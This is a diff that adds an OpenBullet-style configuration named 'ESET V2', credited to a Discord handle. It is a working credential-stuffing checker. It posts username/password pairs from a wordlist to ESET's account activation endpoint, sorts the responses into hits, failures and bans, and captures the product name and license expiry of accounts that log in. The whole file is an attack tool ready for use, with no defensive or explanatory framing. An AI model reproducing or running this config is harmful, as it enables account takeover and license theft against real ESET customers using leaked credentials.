@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "ESET V2",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-17T18:52:40.3825901-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://edf.eset.com:443/edf" 
+  CONTENT "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<ecp:message xmlns:ecp=\"http://www.eset.com/2012/02/ecp\">\\n <ecp:container type=\"identification\" domain=\"meta\">\\n  <seatid>cf83640a-c63c-4694-a552-ce941123c244</seatid>\\n </ecp:container>\\n <ecp:container type=\"request\" domain=\"eset-account\">\\n  <ecp:command name=\"activation\" version=\"2.1\">\\n   <validate-only>true</validate-only>\\n   <acttype>ASSOCIATED_LICENSE_ACTIVATION</acttype>\\n   <actoption>MECAC_ACTIVATION</actoption>\\n   <creds>\\n    <of>ACCOUNT_OWNER</of>\\n    <uname><USER></uname>\\n    <passwd><PASS></passwd>\\n   </creds>\\n   <application>\\n    <product>\\n     <code>106</code>\\n    </product>\\n   </application>\\n  </ecp:command>\\n </ecp:container>\\n</ecp:message>\\n" 
+  CONTENTTYPE "text/xml" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "LICENSE_ATTRS_REQUIRED" 
+  KEYCHAIN Success AND 
+    KEY "LICENSE_ATTRS_REQUIRED" 
+    KEY "pkey>" 
+  KEYCHAIN Failure AND 
+    KEY "eset-account" 
+    KEY "<SOURCE>" DoesNotContain "LICENSE_ATTRS_REQUIRED" 
+    KEY "<SOURCE>" DoesNotContain "That’s all we know" 
+  KEYCHAIN Ban OR 
+    KEY "That’s all we know" 
+  KEYCHAIN Failure OR 
+    KEY "20102001" 
+
+PARSE "<SOURCE>" LR "productlicenselist><products><product><name>" "<" CreateEmpty=FALSE -> CAP "PRODUCT" 
+
+PARSE "<SOURCE>" LR "expiration date : " " " CreateEmpty=FALSE -> CAP "EXPIRATION" 
+
